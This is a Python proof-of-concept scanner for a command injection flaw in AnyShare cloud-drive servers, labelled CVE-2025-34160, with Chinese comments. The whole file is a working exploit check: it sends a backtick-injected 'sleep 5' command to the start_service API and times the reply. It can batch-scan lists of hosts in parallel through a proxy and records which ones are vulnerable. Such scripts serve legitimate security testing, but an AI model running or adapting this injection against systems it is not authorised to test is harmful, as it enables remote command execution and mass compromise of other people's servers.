#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import requests
import urllib3
import sys
import os
import time
from multiprocessing import Pool

# 忽略SSL证书警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 全局代理变量
PROXIES = None

BANNER = r"""
   ██╗    ██╗███████╗██╗ ██████╗██╗  ██╗ █████╗  ██████╗ 
   ██║    ██║██╔════╝██║██╔════╝██║  ██║██╔══██╗██╔═══██╗
   ██║ █╗ ██║█████╗  ██║██║     ███████║███████║██║   ██║
   ██║███╗██║██╔══╝  ██║██║     ██╔══██║██╔══██║██║   ██║
   ╚███╔███╔╝███████╗██║╚██████╗██║  ██║██║  ██║╚██████╔╝
    ╚══╝╚══╝ ╚══════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ 
                                                   
          Author: weichao (围巢)
          Version: 1.0
          Description: 爱数AnyShare云盘 start_service 远程代码执行漏洞 POC
          漏洞编号: CVE-2025-34160
          漏洞类型: 命令注入 (OS Command Injection)
"""

def check_vulnerability(url):
    """
    检测单个URL是否存在命令注入漏洞
    漏洞接口: /api/ServiceAgent/start_service (POST)
    """
    url = url.strip()
    if not url.startswith(("http://", "https://")):
        url = "http://" + url

    # 使用sleep命令检测，若漏洞存在则请求会延迟
    payload = ["`sleep 5`"]
    api_path = "/api/ServiceAgent/start_service"
    target_url = url.rstrip('/') + api_path

    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

    try:
        start_time = time.time()
        resp = requests.post(
            target_url,
            json=payload,  # 直接发送JSON数组
            headers=headers,
            proxies=PROXIES,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        elapsed_time = time.time() - start_time

        # 判断依据：响应成功且延迟大于5秒（sleep 5成功执行）
        if resp.status_code == 200 and elapsed_time > 5:
            print(f"[+] {target_url} 存在漏洞 (响应延迟: {elapsed_time:.2f}s)")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(f"{target_url}\n")
            return True
        else:
            print(f"[-] {target_url} 不存在漏洞 (响应延迟: {elapsed_time:.2f}s)")
            return False

    except requests.exceptions.RequestException as e:
        print(f"[!] 请求 {target_url} 时发生错误: {e}")
        return None

def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="爱数AnyShare云盘 start_service 远程代码执行漏洞检测POC (CVE-2025-34160)"
    )
    parser.add_argument('-u', '--url', type=str, help='单个URL检测 (例如: http://192.168.1.100)')
    parser.add_argument('-f', '--file', type=str, help='批量检测文件 (每行一个URL)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='并发进程数 (默认10)')
    parser.add_argument('--proxy', type=str, help='代理地址 (例如: http://127.0.0.1:7890)')
    args = parser.parse_args()

    # 设置全局代理
    global PROXIES
    if args.proxy:
        PROXIES = {
            "http": args.proxy,
            "https": args.proxy
        }

    # 单URL检测
    if args.url:
        check_vulnerability(args.url)
        return

    # 批量检测
    if args.file:
        if not os.path.exists(args.file):
            print(f"错误: 文件 '{args.file}' 不存在")
            sys.exit(1)

        with open(args.file, 'r', encoding='utf-8') as f:
            urls = [line.strip() for line in f if line.strip()]

        if not urls:
            print("文件中没有有效的URL")
            sys.exit(1)

        print(f"开始批量检测，共 {len(urls)} 个目标，并发进程数: {args.threads}")
        with Pool(processes=args.threads) as pool:
            pool.map(check_vulnerability, urls)

        print("\n扫描完成！存在漏洞的URL已保存至 result.txt")
    else:
        parser.print_help()

if __name__ == "__main__":
    main()